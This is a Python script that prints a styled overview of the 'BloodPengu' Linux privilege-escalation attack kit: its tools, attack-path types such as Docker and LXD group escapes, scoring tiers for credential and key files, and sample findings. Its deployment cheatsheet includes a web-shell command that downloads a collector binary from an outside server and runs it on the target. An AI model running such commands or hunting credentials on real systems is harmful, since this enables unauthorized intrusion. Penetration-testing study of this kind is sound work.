#!/usr/bin/env python3

import sys
import time
import shutil

RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RED     = "\033[31m"
BRED    = "\033[1;31m"
ORANGE  = "\033[33m"
BORANGE = "\033[1;33m"
WHITE   = "\033[1;37m"
GREY    = "\033[0;37m"
DGREY   = "\033[2;37m"
CYAN    = "\033[0;36m"
GREEN   = "\033[0;32m"
BGREEN  = "\033[1;32m"

def term_width():
    return shutil.get_terminal_size((120, 40)).columns

def banner():
    print()
    print(f"{BORANGE} BloodPengu Kit {RESET}  {DGREY}v2.0.3  by <@AdverXarial> | <github.com/pengu-apm>{RESET}")
    print(f"{DGREY} BloodPengu Kit and Collections{RESET}")
    print()

def divider(label=None):
    w = min(term_width(), 120)
    if label:
        side = (w - len(label) - 4) // 2
        print(f"{DGREY}  {'-' * side} {BORANGE}{label}{DGREY} {'-' * side}{RESET}")
    else:
        print(f"{DGREY}  {'-' * (w - 4)}{RESET}")
    print()

def nxline(tool, lang, tier, description, extra=None):
    tool_col   = f"{BORANGE}{tool:<16}{RESET}"
    lang_col   = f"{DGREY}{lang:<6}{RESET}"
    tier_color = BRED if tier == "CRITICAL" else BORANGE if tier == "HIGH" else ORANGE
    tier_col   = f"{tier_color}[{tier:<8}]{RESET}"
    desc_col   = f"{WHITE}{description}{RESET}"
    print(f"  {tool_col} {lang_col} {tier_col}  {desc_col}")
    if extra:
        print(f"  {' ' * 16} {' ' * 6} {' ' * 11}  {DGREY}{extra}{RESET}")

def nxsection(label):
    print()
    print(f"  {BORANGE}[*]{RESET} {ORANGE}{label}{RESET}")
    print(f"  {DGREY}{'-' * 60}{RESET}")

def nxheader():
    print(f"  {BORANGE}{'TOOL':<16}{RESET} {DGREY}{'LANG':<6}{RESET} {DGREY}{'TIER':<10}{RESET}  {WHITE}DESCRIPTION{RESET}")
    print(f"  {DGREY}{'-' * 15}  {'-' * 5}  {'-' * 10}  {'-' * 48}{RESET}")

def nxstat(label, value, color=WHITE):
    print(f"  {DGREY}[{RESET}{BORANGE}~{RESET}{DGREY}]{RESET}  {DGREY}{label:<28}{RESET}{color}{value}{RESET}")

def nxfinding(tier, tool, path, reason):
    tier_color = BRED if tier == "CRITICAL" else BORANGE if tier == "HIGH" else ORANGE
    tier_label = f"{tier_color}[{tier:<8}]{RESET}"
    print(f"  {tier_label}  {BORANGE}{tool:<14}{RESET}  {WHITE}{path}{RESET}")
    print(f"  {' ' * 12}  {' ' * 14}  {DGREY}{reason}{RESET}")
    print()

def nxinfo(label, value, label_color=BORANGE):
    print(f"  {label_color}[+]{RESET}  {DGREY}{label:<28}{RESET}{WHITE}{value}{RESET}")

def nxwarn(msg):
    print(f"  {BRED}[!]{RESET}  {WHITE}{msg}{RESET}")

def slow_print(lines, delay=0.03):
    for line in lines:
        print(line)
        time.sleep(delay)
        sys.stdout.flush()

def main():
    banner()
    divider()

    nxsection("Attack Suite Overview")
    print()
    nxheader()
    print()

    slow_print([
        f"  {BORANGE}{'BloodPengu':<16}{RESET} {DGREY}{'JS':<6}{RESET} {BRED}[{'CORE APM':<8}]{RESET}  {WHITE}Graph-based Linux attack surface visualization and privesc mapper{RESET}",
        f"  {' ' * 16} {' ' * 6} {' ' * 11}  {DGREY}Ingests JSON from PyPengu, renders force-directed attack graphs with nodes and edges{RESET}",
        "",
        f"  {BORANGE}{'PyPengu':<16}{RESET} {DGREY}{'Go':<6}{RESET} {BORANGE}[{'COLLECTOR':<8}]{RESET}  {WHITE}Static binary system collector zero dependencies on target{RESET}",
        f"  {' ' * 16} {' ' * 6} {' ' * 11}  {DGREY}Enumerates sudo, SUID, groups, services, cron, kernel CVEs, container membership{RESET}",
        "",
        f"  {BORANGE}{'HydraPengu':<16}{RESET} {DGREY}{'Bash':<6}{RESET} {BORANGE}[{'RECON':<8}]{RESET}  {WHITE}Live behavioral recon watches /proc in real time from any privilege{RESET}",
        f"  {' ' * 16} {' ' * 6} {' ' * 11}  {DGREY}Detects recurring scripts by spawn pattern, flags network connections, file activity{RESET}",
        "",
        f"  {BORANGE}{'LAY':<16}{RESET} {DGREY}{'Rust':<6}{RESET} {BRED}[{'DISCOVERY':<8}]{RESET}  {WHITE}Dangerous access file discovery scoring engine not a checklist{RESET}",
        f"  {' ' * 16} {' ' * 6} {' ' * 11}  {DGREY}Finds P2sswd-sec.txt not just password.txt leet decode, context scoring, 3 tiers{RESET}",
        "",
        f"  {BORANGE}{'BRACE':<16}{RESET} {DGREY}{'Bash':<6}{RESET} {BORANGE}[{'COLLECTOR':<8}]{RESET}  {WHITE}Container and cloud relationship analysis Docker, LXD, K8s, cloud creds{RESET}",
        f"  {' ' * 16} {' ' * 6} {' ' * 11}  {DGREY}Maps Docker socket exposure, LXD group escapes, service account tokens{RESET}",
        "",
        f"  {BORANGE}{'SACSPengu':<16}{RESET} {DGREY}{'Bash':<6}{RESET} {ORANGE}[{'COMPILE':<8}]{RESET}  {WHITE}Compiler-based privesc suggestion finds compilation attack vectors{RESET}",
        f"  {' ' * 16} {' ' * 6} {' ' * 11}  {DGREY}Detects gcc, make, writable source paths, shared library injection vectors{RESET}",
        "",
        f"  {BORANGE}{'TierDangerTable':<16}{RESET} {DGREY}{'HTML':<6}{RESET} {ORANGE}[{'REFERENCE':<8}]{RESET}  {WHITE}BloodPengu query and danger tier quick-reference for active assessments{RESET}",
        f"  {' ' * 16} {' ' * 6} {' ' * 11}  {DGREY}Node types, edge types, pre-built query reminders open during engagements{RESET}",
    ], delay=0.04)

    print()
    divider()

    nxsection("Graph Edge Types Attack Paths")
    print()
    slow_print([
        f"  {BORANGE}MemberOf{RESET}          {DGREY}->{RESET}  {WHITE}User is a member of a group{RESET}",
        f"  {BRED}LXDGroupEscape{RESET}    {DGREY}->{RESET}  {WHITE}LXD group membership enables container image escape to root{RESET}",
        f"  {BRED}DockerEscape{RESET}      {DGREY}->{RESET}  {WHITE}Docker group membership enables socket-based escape to root{RESET}",
        f"  {BRED}SudoNoPasswd{RESET}      {DGREY}->{RESET}  {WHITE}Sudo rule allows execution as root with no password required{RESET}",
        f"  {BRED}KernelExploit{RESET}     {DGREY}->{RESET}  {WHITE}Kernel version matches a known CVE local privilege escalation{RESET}",
        f"  {BORANGE}SUIDBin{RESET}           {DGREY}->{RESET}  {WHITE}SUID binary is exploitable via GTFOBins execute as owner{RESET}",
        f"  {BORANGE}CronHijack{RESET}        {DGREY}->{RESET}  {WHITE}Writable script executed by a privileged cron job{RESET}",
        f"  {BORANGE}ServiceHijack{RESET}     {DGREY}->{RESET}  {WHITE}Writable systemd unit file or script executed as root{RESET}",
    ], delay=0.04)

    print()
    divider()

    nxsection("Scoring Engine LAY Tiers")
    print()
    slow_print([
        f"  {BRED}[CRITICAL ]{RESET}  {WHITE}Score 120+{RESET}   {DGREY}SSH keys, shadow files, world-writable /etc, decoded leet credentials{RESET}",
        f"  {BORANGE}[HIGH     ]{RESET}  {WHITE}Score 70+{RESET}    {DGREY}Database files, .env in web roots, backup files, SSH directory contents{RESET}",
        f"  {ORANGE}[POTENTIAL]{RESET}  {WHITE}Score 30+{RESET}    {DGREY}Sensitive name patterns, executables in home dirs, unusual hidden files{RESET}",
    ], delay=0.04)

    print()
    divider()

    nxsection("Example Findings Live Assessment")
    print()
    slow_print([
        f"  {BRED}[CRITICAL ]{RESET}  {BORANGE}{'LAY':<14}{RESET}  {WHITE}/home/vuln-user/.ssh/id_rsa{RESET}",
        f"  {' ' * 12}  {' ' * 14}  {DGREY}SSH private key world-readable (644) Name matches critical pattern: id_rsa{RESET}",
        "",
        f"  {BRED}[CRITICAL ]{RESET}  {BORANGE}{'LAY':<14}{RESET}  {WHITE}/var/www/html/.env{RESET}",
        f"  {' ' * 12}  {' ' * 14}  {DGREY}Sensitive extension: .env Config file in web root DB_PASSWORD detected{RESET}",
        "",
        f"  {BORANGE}[HIGH     ]{RESET}  {BORANGE}{'HydraPengu':<14}{RESET}  {WHITE}/opt/scripts/backup.sh{RESET}",
        f"  {' ' * 12}  {' ' * 14}  {DGREY}Recurring detected: backup.sh spawned 4x avg interval=60s owner=root{RESET}",
        "",
        f"  {BORANGE}[HIGH     ]{RESET}  {BORANGE}{'PyPengu':<14}{RESET}  {WHITE}vuln-user -> MemberOf -> lxd{RESET}",
        f"  {' ' * 12}  {' ' * 14}  {DGREY}LXDGroupEscape -> root (1 hop) lxd image init escape confirmed available{RESET}",
        "",
        f"  {BORANGE}[HIGH     ]{RESET}  {BORANGE}{'PyPengu':<14}{RESET}  {WHITE}vuln-user -> MemberOf -> docker{RESET}",
        f"  {' ' * 12}  {' ' * 14}  {DGREY}DockerEscape -> root (1 hop) Docker socket exposed at /var/run/docker.sock{RESET}",
        "",
        f"  {ORANGE}[POTENTIAL]{RESET}  {BORANGE}{'LAY':<14}{RESET}  {WHITE}/tmp/P2sswd-sec.txt{RESET}",
        f"  {' ' * 12}  {' ' * 14}  {DGREY}Obfuscated critical name: P2sswd -> passwd Leet decode triggered scoring{RESET}",
        "",
    ], delay=0.04)

    divider()

    nxsection("Deployment Cheatsheet")
    print()
    slow_print([
        f"  {BORANGE}[PyPengu  ]{RESET}  {DGREY}Target (x86_64){RESET}  {WHITE}chmod +x pypengu-linux-amd64 && ./pypengu-linux-amd64{RESET}",
        f"  {BORANGE}[PyPengu  ]{RESET}  {DGREY}Web shell      {RESET}  {WHITE}curl -o /tmp/p http://srv/pypengu-linux-amd64 && chmod +x /tmp/p && /tmp/p{RESET}",
        f"  {BORANGE}[LAY      ]{RESET}  {DGREY}Auto-detect    {RESET}  {WHITE}./lay   (wrapper selects correct binary from uname -m){RESET}",
        f"  {BORANGE}[LAY      ]{RESET}  {DGREY}Direct         {RESET}  {WHITE}./lay-linux-x86_64  |  ./lay-linux-arm64{RESET}",
        f"  {BORANGE}[Hydra    ]{RESET}  {DGREY}Static scan    {RESET}  {WHITE}bash hydrapengu.sh -static -v{RESET}",
        f"  {BORANGE}[Hydra    ]{RESET}  {DGREY}Monitor 60s    {RESET}  {WHITE}bash hydrapengu.sh -dynamic -time 60{RESET}",
        f"  {BORANGE}[Build LAY]{RESET}  {DGREY}From source    {RESET}  {WHITE}source ~/.cargo/env && bash build.sh{RESET}",
    ], delay=0.04)

    print()
    divider()

    nxsection("Suite Statistics")
    print()
    nxstat("Total tools",           "7",                              BORANGE)
    nxstat("Languages",             "Rust, Go, Bash, JS/TS, HTML",   WHITE)
    nxstat("Architectures (LAY)",   "x86_64, ARM64, x86, ARM32",     WHITE)
    nxstat("Target access level",   "Any webshell to root",        BGREEN)
    nxstat("Dependencies on target","Zero all static or bash",     BGREEN)
    nxstat("Organization",          "github.com/pengu-apm",          BORANGE)
    nxstat("Documentation",         "pengu-apm.github.io",           BORANGE)
    nxstat("Maintained by",         "AdverXarial / byt3n33dl3",      WHITE)
    print()

    divider()
    print(f"  {DGREY}BloodPengu Attack Kit by <@AdverXarial> | 2026{RESET}")
    print()

if __name__ == "__main__":
    main()
